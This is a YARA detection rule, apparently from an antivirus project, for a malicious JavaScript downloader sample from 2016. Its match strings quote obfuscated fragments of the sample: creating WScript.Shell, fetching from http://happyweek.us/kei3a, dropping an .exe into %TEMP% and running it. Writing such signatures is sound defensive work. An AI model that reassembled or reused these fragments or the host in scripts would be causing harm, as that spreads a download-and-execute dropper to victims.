rule sig_20160328_e7d6b7ae5fd13fa25493685fd6a57d7b {
  meta:
    description = "datamaliciousorder - file 20160328_e7d6b7ae5fd13fa25493685fd6a57d7b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ad9ffd5f08fcdb81ca6850a9b7ccbb587b030db910a1aa30947fa3bcf8d1f923"

  strings:
    $s1  = "function Svpjmkq() {return Nkqwt[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"EPelPAG8xI2.exe\";};" fullword ascii
    $s2  = "do {WScript[Aozhnvnzs](Koobufsuhm() * 11)} while (Jxgss[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Wbjsoi(Dqzmflhi, Cnzbgyszuc){return Dqzmflhi - Cnzbgyszuc;};" fullword ascii
    $s4  = "Jxgss[Pklirjcwl](\"GET\", \"http://happyweek.us/kei3a\", false);" fullword ascii
    $s5  = "var Nkqwt = function Amianiui() {return WScript[Rdxaesbap](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Rlphcwb() {return ((Phkmfyusaq == true) && (Phkmfyusaq == Paikajccqm)) ? 1 : Cywjhvpb;};" fullword ascii
    $s7  = "function Yqkkte(Lfrwdu){Nkqwt[\"Run\"](Lfrwdu, Cywjhvpb, Cywjhvpb);};" fullword ascii
    $s8  = "var Paikajccqm = false;" fullword ascii
    $s9  = "Phkmfyusaq = true; " fullword ascii
    $s10 = "return Wbjsoi(Ptxaeedl, Edslxyrsqc);" fullword ascii
    $s11 = "function Mvlvree(){return Nppbnc;};" fullword ascii
    $s12 = "Paikajccqm = true; " fullword ascii
    $s13 = "var Nvchx = false;" fullword ascii
    $s14 = " while (Ibmcbzzfa){" fullword ascii
    $s15 = "function Bnzxhvy(){return Rdxaesbap;};" fullword ascii
    $s16 = "var Phkmfyusaq = false;" fullword ascii
    $s17 = "function Nvygftm(Oviup) {var Teewij = (1, 2, 3, 4, 5, Oviup); return Teewij;};" fullword ascii
    $s18 = "var Ozgsxpcxwf = new this[\"Date\"]();" fullword ascii
    $s19 = "function Htnhx()" fullword ascii
    $s20 = "function Koobufsuhm(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}